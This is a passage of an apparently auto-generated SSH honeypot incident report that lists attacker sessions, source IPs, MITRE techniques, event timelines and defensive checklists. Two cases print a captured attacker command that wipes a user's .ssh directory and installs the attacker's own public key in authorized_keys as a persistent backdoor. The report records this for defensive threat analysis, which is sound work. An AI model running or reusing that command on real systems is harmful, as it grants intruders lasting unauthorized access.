- [ ] Block `111.238.174[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-924ef31e75b8

| Field | Detail |
|---|---|
| **Source IP** | `50.6.207[.]102` |
| **First Seen** | 2026-11-16 07:40 |
| **Last Seen** | 2026-11-16 07:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:40:57` | `cowrie.session.connect` |
| `2026-11-16 07:40:57` | `cowrie.client.version` |
| `2026-11-16 07:40:57` | `cowrie.client.kex` |
| `2026-11-16 07:40:57` | `cowrie.login.success` |
| `2026-11-16 07:40:57` | `cowrie.session.params` |
| `2026-11-16 07:40:57` | `cowrie.command.input` |
| `2026-11-16 07:40:57` | `cowrie.command.failed` |
| `2026-11-16 07:40:57` | `cowrie.log.closed` |
| `2026-11-16 07:40:58` | `cowrie.session.params` |
| `2026-11-16 07:40:58` | `cowrie.command.input` |
| `2026-11-16 07:40:58` | `cowrie.session.file_download` |
| `2026-11-16 07:40:58` | `cowrie.log.closed` |
| `2026-11-16 07:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.207[.]102` to AbuseIPDB if not already reported
- [ ] Block `50.6.207[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3adef7d2d776

| Field | Detail |
|---|---|
| **Source IP** | `50.6.207[.]102` |
| **First Seen** | 2026-11-16 07:40 |
| **Last Seen** | 2026-11-16 07:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:40:58` | `cowrie.session.connect` |
| `2026-11-16 07:40:58` | `cowrie.client.version` |
| `2026-11-16 07:40:58` | `cowrie.client.kex` |
| `2026-11-16 07:40:58` | `cowrie.login.success` |
| `2026-11-16 07:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.207[.]102` to AbuseIPDB if not already reported
- [ ] Block `50.6.207[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0c1aeac698f

| Field | Detail |
|---|---|
| **Source IP** | `191.7.159[.]201` |
| **First Seen** | 2026-11-16 07:43 |
| **Last Seen** | 2026-11-16 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:43:06` | `cowrie.session.connect` |
| `2026-11-16 07:43:06` | `cowrie.client.version` |
| `2026-11-16 07:43:06` | `cowrie.client.kex` |
| `2026-11-16 07:43:06` | `cowrie.login.success` |
| `2026-11-16 07:43:07` | `cowrie.session.params` |
| `2026-11-16 07:43:07` | `cowrie.command.input` |
| `2026-11-16 07:43:07` | `cowrie.log.closed` |
| `2026-11-16 07:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.7.159[.]201` to AbuseIPDB if not already reported
- [ ] Block `191.7.159[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd95a2770d2

| Field | Detail |
|---|---|
| **Source IP** | `182.237.13[.]208` |
| **First Seen** | 2026-11-16 07:43 |
| **Last Seen** | 2026-11-16 07:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:43:47` | `cowrie.session.connect` |
| `2026-11-16 07:43:47` | `cowrie.client.version` |
| `2026-11-16 07:43:47` | `cowrie.client.kex` |
| `2026-11-16 07:43:48` | `cowrie.login.success` |
| `2026-11-16 07:43:49` | `cowrie.session.params` |
| `2026-11-16 07:43:49` | `cowrie.command.input` |
| `2026-11-16 07:43:49` | `cowrie.command.failed` |
| `2026-11-16 07:43:50` | `cowrie.log.closed` |
| `2026-11-16 07:43:51` | `cowrie.session.params` |
| `2026-11-16 07:43:51` | `cowrie.command.input` |
| `2026-11-16 07:43:51` | `cowrie.session.file_download` |
| `2026-11-16 07:43:51` | `cowrie.log.closed` |
| `2026-11-16 07:43:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.237.13[.]208` to AbuseIPDB if not already reported
- [ ] Block `182.237.13[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b22cc5b54e01

| Field | Detail |
|---|---|
| **Source IP** | `182.237.13[.]208` |
| **First Seen** | 2026-11-16 07:43 |
| **Last Seen** | 2026-11-16 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:43:51` | `cowrie.session.connect` |
| `2026-11-16 07:43:51` | `cowrie.client.version` |
| `2026-11-16 07:43:51` | `cowrie.client.kex` |
| `2026-11-16 07:43:52` | `cowrie.login.success` |
| `2026-11-16 07:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.237.13[.]208` to AbuseIPDB if not already reported
- [ ] Block `182.237.13[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d820d4bb92

| Field | Detail |
|---|---|
| **Source IP** | `100.33.23[.]13` |
| **First Seen** | 2026-11-16 07:48 |
| **Last Seen** | 2026-11-16 07:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `netstat -tulpn | head -10` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:48:15` | `cowrie.session.connect` |
| `2026-11-16 07:48:15` | `cowrie.client.version` |
| `2026-11-16 07:48:15` | `cowrie.client.kex` |
| `2026-11-16 07:48:15` | `cowrie.login.success` |
| `2026-11-16 07:48:16` | `cowrie.session.params` |
| `2026-11-16 07:48:16` | `cowrie.command.input` |
| `2026-11-16 07:48:16` | `cowrie.log.closed` |
| `2026-11-16 07:48:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `100.33.23[.]13` to AbuseIPDB if not already reported
- [ ] Block `100.33.23[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-097a8fbaa1d1

| Field | Detail |
|---|---|
| **Source IP** | `174.68.45[.]93` |
| **First Seen** | 2026-11-16 07:48 |
| **Last Seen** | 2026-11-16 07:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-16 07:48:59` | `cowrie.session.connect` |
| `2026-11-16 07:48:59` | `cowrie.client.version` |
| `2026-11-16 07:48:59` | `cowrie.client.kex` |
| `2026-11-16 07:49:01` | `cowrie.login.success` |
| `2026-11-16 07:49:02` | `cowrie.direct-tcpip.request` |
| `2026-11-16 07:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.68.45[.]93` to AbuseIPDB if not already reported
- [ ] Block `174.68.45[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (451) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-c98135ca2077 | HIGH | `112.86.156[.]251` | 2026-11-16 07:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7e61c44a2c44 | HIGH | `31.208.252[.]51` | 2026-11-16 07:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e8a1a839b191 | HIGH | `113.158.205[.]225` | 2026-11-16 07:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-de21993b5776 | HIGH | `70.184.126[.]12` | 2026-11-16 07:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-28865c169839 | HIGH | `109.160.32[.]118` | 2026-11-16 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-848bc7518a2c | HIGH | `77.90.185[.]29` | 2026-11-16 08:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1f20911220f4 | HIGH | `80.94.95[.]118` | 2026-11-16 08:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-66e48d2b1c31 | HIGH | `138.226.239[.]233` | 2026-11-16 08:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-740eff0422b9 | HIGH | `92.118.39[.]75` | 2026-11-16 08:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-59d127e595ad | HIGH | `138.226.239[.]234` | 2026-11-16 08:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2c401e5bdd14 | HIGH | `92.118.39[.]75` | 2026-11-16 08:04 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d06070611eea | HIGH | `92.118.39[.]75` | 2026-11-16 08:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-32f7dbbdf4b5 | HIGH | `92.118.39[.]75` | 2026-11-16 08:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-934ac830d5a7 | HIGH | `92.118.39[.]75` | 2026-11-16 08:10 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-97ccc281861e | HIGH | `92.118.39[.]75` | 2026-11-16 08:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-96ca3a198627 | HIGH | `191.7.159[.]201` | 2026-11-16 08:14 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-d3765e383d20 | HIGH | `100.33.23[.]13` | 2026-11-16 08:14 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2a53d481202f | HIGH | `92.118.39[.]75` | 2026-11-16 08:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bff17abc1e71 | HIGH | `92.118.39[.]75` | 2026-11-16 08:17 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7ace893ee0c5 | HIGH | `92.118.39[.]75` | 2026-11-16 08:19 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8dea3636dd3f | HIGH | `176.53.159[.]196` | 2026-11-16 08:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7f8b9baadd9c | HIGH | `92.118.39[.]75` | 2026-11-16 08:20 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c17f8475e8fd | HIGH | `92.118.39[.]75` | 2026-11-16 08:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5fc52f66e126 | HIGH | `92.118.39[.]75` | 2026-11-16 08:24 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8908e29b53d3 | HIGH | `92.118.39[.]75` | 2026-11-16 08:27 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5ce5a69b3a43 | HIGH | `8.209.82[.]97` | 2026-11-16 08:28 | Y | 2 | 0 | `T1078 · T1105` |
| IR-e6f1643d3641 | HIGH | `92.118.39[.]75` | 2026-11-16 08:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ef13f5abff17 | HIGH | `92.118.39[.]75` | 2026-11-16 08:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f9e2b1b3f9d4 | HIGH | `195.178.110[.]78` | 2026-11-16 08:32 | Y | 0 | 0 | `T1078` |
| IR-ffa5521e3fd9 | HIGH | `182.156.35[.]238` | 2026-11-16 08:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a129bb8cbe4d | HIGH | `65.20.216[.]133` | 2026-11-16 08:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d27acf380b52 | HIGH | `104.244.79[.]113` | 2026-11-16 08:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c06c7307afb6 | HIGH | `37.113.113[.]77` | 2026-11-16 08:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f521586645a4 | HIGH | `183.107.76[.]127` | 2026-11-16 08:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d46f5a08ea69 | HIGH | `100.33.23[.]13` | 2026-11-16 08:43 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-18ea7565a0aa | HIGH | `191.7.159[.]201` | 2026-11-16 08:45 | Y | 1 | 0 | `T1057 · T1078 · T1083` |
| IR-39a6ab60919c | HIGH | `77.239.124[.]252` | 2026-11-16 08:46 | Y | 0 | 0 | `T1078` |
| IR-2e12c3b7af08 | HIGH | `92.118.39[.]75` | 2026-11-16 08:46 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-af12f4734889 | HIGH | `221.222.160[.]175` | 2026-11-16 08:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7189db5c6783 | HIGH | `181.58.70[.]249` | 2026-11-16 08:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-405a02462413 | HIGH | `60.21.100[.]63` | 2026-11-16 09:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7681e2c21db5 | HIGH | `100.33.23[.]13` | 2026-11-16 09:15 | Y | 1 | 0 | `T1078 · T1592` |
| IR-89eef9767c01 | HIGH | `113.11.34[.]221` | 2026-11-16 09:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ec5d91acd266 | HIGH | `117.254.119[.]147` | 2026-11-16 09:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-05a00a08948b | HIGH | `195.178.110[.]26` | 2026-11-16 09:42 | Y | 1 | 0 | `T1078 · T1592` |
| IR-01a2b45af8a8 | HIGH | `100.33.23[.]13` | 2026-11-16 09:51 | Y | 1 | 0 | `T1057 · T1078 · T1083` |
| IR-f40555c65a6e | HIGH | `191.7.159[.]201` | 2026-11-16 09:54 | Y | 1 | 0 | `T1078 · T1592` |
| IR-276fdff3f638 | HIGH | `65.20.143[.]19` | 2026-11-16 09:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5838c4042e38 | HIGH | `74.196.184[.]15` | 2026-11-16 09:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-23b03774ec3b | HIGH | `211.178.165[.]251` | 2026-11-16 09:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ec9f4b056417 | HIGH | `160.119.66[.]206` | 2026-11-16 09:57 | Y | 6 | 3 | `T1059.004 · T1078 · T1105` |
| IR-c93fcefcbd38 | HIGH | `160.119.66[.]206` | 2026-11-16 09:57 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-9ea68fe3bf73 | HIGH | `177.27.76[.]210` | 2026-11-16 09:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ae894c5b364e | HIGH | `176.57.76[.]206` | 2026-11-16 09:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f35f94ec2866 | HIGH | `195.178.110[.]26` | 2026-11-16 10:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-192a5ad859bc | HIGH | `80.94.92[.]55` | 2026-11-16 10:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-301da92d9f11 | HIGH | `176.53.159[.]196` | 2026-11-16 10:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1524680c44c0 | HIGH | `77.90.185[.]29` | 2026-11-16 10:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5e72403b6eca | HIGH | `138.226.239[.]233` | 2026-11-16 10:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b8741f1f135b | HIGH | `195.178.110[.]78` | 2026-11-16 10:06 | Y | 0 | 0 | `T1078` |
| IR-8075d5528e22 | HIGH | `138.226.239[.]234` | 2026-11-16 10:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0815477a6a5e | HIGH | `77.239.124[.]252` | 2026-11-16 10:10 | Y | 0 | 0 | `T1078` |
| IR-e31c118c1731 | HIGH | `178.88.130[.]247` | 2026-11-16 10:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b91926ad1e79 | HIGH | `177.159.150[.]111` | 2026-11-16 10:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-13e744d97653 | HIGH | `218.149.228[.]159` | 2026-11-16 10:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-669898a88867 | HIGH | `111.171.125[.]94` | 2026-11-16 10:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-116c1dfcf555 | HIGH | `196.190.180[.]18` | 2026-11-16 10:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-608004e0c58c | HIGH | `119.194.33[.]34` | 2026-11-16 10:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b1422f8fb0a1 | HIGH | `98.172.187[.]202` | 2026-11-16 10:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-32d1d58459af | HIGH | `104.194.37[.]176` | 2026-11-16 10:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-73cef83e8828 | HIGH | `49.124.152[.]240` | 2026-11-16 10:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c58afbc47356 | HIGH | `193.187.110[.]160` | 2026-11-16 10:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7833efa97d4b | HIGH | `100.33.23[.]13` | 2026-11-16 10:25 | Y | 1 | 0 | `T1078 · T1592` |
| IR-1a2e7fefc470 | HIGH | `191.7.159[.]201` | 2026-11-16 10:27 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c32e04128a56 | HIGH | `112.156.166[.]41` | 2026-11-16 10:38 | Y | 6 | 0 | `T1078` |
| IR-8d8d046ab51a | HIGH | `96.1.40[.]151` | 2026-11-16 10:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c66b4ec8117e | HIGH | `45.175.20[.]14` | 2026-11-16 10:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c8e4d9b2826c | HIGH | `100.33.23[.]13` | 2026-11-16 11:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ec864e0ac3c8 | HIGH | `191.7.159[.]201` | 2026-11-16 11:02 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f8dc7e22fb99 | HIGH | `171.226.12[.]127` | 2026-11-16 11:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-62cf9f048c07 | HIGH | `80.65.90[.]155` | 2026-11-16 11:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dfa4e7383576 | HIGH | `218.248.19[.]102` | 2026-11-16 11:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1b296389d050 | HIGH | `46.201.247[.]21` | 2026-11-16 11:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3f7775ad7680 | HIGH | `51.195.40[.]26` | 2026-11-16 11:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f845bc8052fa | HIGH | `51.195.40[.]26` | 2026-11-16 11:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0f1f477f9a85 | HIGH | `191.7.159[.]201` | 2026-11-16 11:35 | Y | 1 | 0 | `T1057 · T1078 · T1083` |
| IR-0357acb03dd2 | HIGH | `82.10.54[.]245` | 2026-11-16 11:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-68ba3f819351 | HIGH | `46.59.109[.]199` | 2026-11-16 11:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-202222e622ff | HIGH | `191.210.73[.]33` | 2026-11-16 11:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2617164e2b43 | HIGH | `78.128.112[.]74` | 2026-11-16 11:39 | Y | 1 | 0 | `T1078 · T1592` |
| IR-13c109d87205 | HIGH | `36.134.69[.]15` | 2026-11-16 11:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ab725246bd85 | HIGH | `195.178.110[.]26` | 2026-11-16 12:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b62607f91d5d | HIGH | `14.55.199[.]214` | 2026-11-16 12:06 | Y | 9 | 0 | `T1057 · T1078 · T1083` |
| IR-996dcec84b51 | HIGH | `191.7.159[.]201` | 2026-11-16 12:09 | Y | 1 | 0 | `T1078 · T1592` |
| IR-30a866fc87d2 | HIGH | `77.90.185[.]29` | 2026-11-16 12:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-82670f38ceaa | HIGH | `80.94.95[.]118` | 2026-11-16 12:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9588a6bd85ad | HIGH | `138.226.239[.]233` | 2026-11-16 12:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0afc01dd5c00 | HIGH | `100.33.23[.]13` | 2026-11-16 12:13 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c4ff6b3566b0 | HIGH | `195.178.110[.]78` | 2026-11-16 12:16 | Y | 0 | 0 | `T1078` |
| IR-87645e667090 | HIGH | `38.106.158[.]9` | 2026-11-16 12:19 | Y | 0 | 0 | `T1078 · T1592` |
_… 351 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `38.43.213[.]195` | **4** | 2026-11-16 06:54 | 2026-11-16 12:10 | 1m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]78` | **3** | 2026-11-16 07:02 | 2026-11-16 10:06 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `77.239.124[.]252` | **3** | 2026-11-16 07:05 | 2026-11-16 10:10 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-11-16 19:43 | 2026-11-16 20:41 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `193.32.162[.]84` | **2** | 2026-11-16 17:47 | 2026-11-16 18:20 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `35.202.9[.]133` | **2** | 2026-11-16 09:57 | 2026-11-16 10:23 | 1m | 0 | `T1592` | 🟢 LOW |
| `38.43.213[.]195` | **2** | 2026-11-16 14:25 | 2026-11-16 16:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]252` | **2** | 2026-11-16 13:26 | 2026-11-16 14:24 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `77.239.124[.]252` | **2** | 2026-11-16 16:44 | 2026-11-16 18:01 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `92.118.39[.]75` | **2** | 2026-11-16 07:48 | 2026-11-16 08:13 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]77` | **2** | 2026-11-16 15:58 | 2026-11-16 16:42 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.96.208[.]174` | 1 | 2026-11-16 09:54 | 2026-11-16 09:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.23.238[.]63` | 1 | 2026-11-16 15:16 | 2026-11-16 15:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `104.250.53[.]191` | 1 | 2026-11-16 20:40 | 2026-11-16 20:40 | 5s | 0 | `T1592` | 🟢 LOW |
| `106.112.194[.]160` | 1 | 2026-11-16 11:39 | 2026-11-16 11:39 | 4s | 0 | `T1592` | 🟢 LOW |
| `109.104.183[.]35` | 1 | 2026-11-16 10:59 | 2026-11-16 10:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]102` | 1 | 2026-11-16 13:48 | 2026-11-16 13:48 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]118` | 1 | 2026-11-16 07:19 | 2026-11-16 07:19 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.197.2[.]116` | 1 | 2026-11-16 19:31 | 2026-11-16 19:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.230.249[.]225` | 1 | 2026-11-16 10:50 | 2026-11-16 10:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.74.91[.]50` | 1 | 2026-11-16 19:52 | 2026-11-16 19:52 | 4s | 0 | `T1592` | 🟢 LOW |
| `120.136.25[.]236` | 1 | 2026-11-16 08:22 | 2026-11-16 08:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `120.27.122[.]227` | 1 | 2026-11-16 20:36 | 2026-11-16 20:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `121.146.212[.]214` | 1 | 2026-11-16 11:20 | 2026-11-16 11:21 | 29s | 0 | `T1592` | 🟢 LOW |
| `128.14.227[.]37` | 1 | 2026-11-16 07:24 | 2026-11-16 07:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-16 18:47 | 2026-11-16 18:47 | 39s | 0 | `T1592` | 🟢 LOW |
| `138.94.203[.]95` | 1 | 2026-11-16 18:12 | 2026-11-16 18:13 | 13s | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | 1 | 2026-11-16 15:32 | 2026-11-16 15:32 | 37s | 0 | `T1592` | 🟢 LOW |
| `144.48.130[.]95` | 1 | 2026-11-16 18:37 | 2026-11-16 18:37 | 12s | 0 | `T1592` | 🟢 LOW |
| `152.42.246[.]223` | 1 | 2026-11-16 17:27 | 2026-11-16 17:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `155.186.182[.]232` | 1 | 2026-11-16 15:48 | 2026-11-16 15:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-11-16 09:44 | 2026-11-16 09:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-16 09:41 | 2026-11-16 09:42 | 47s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-16 14:00 | 2026-11-16 14:00 | 22s | 0 | `T1592` | 🟢 LOW |
| `167.250.118[.]12` | 1 | 2026-11-16 07:04 | 2026-11-16 07:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]222` | 1 | 2026-11-16 19:09 | 2026-11-16 19:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]224` | 1 | 2026-11-16 14:28 | 2026-11-16 14:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.250.24[.]204` | 1 | 2026-11-16 13:51 | 2026-11-16 13:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.20.185[.]214` | 1 | 2026-11-16 18:56 | 2026-11-16 18:56 | 15s | 0 | `T1592` | 🟢 LOW |
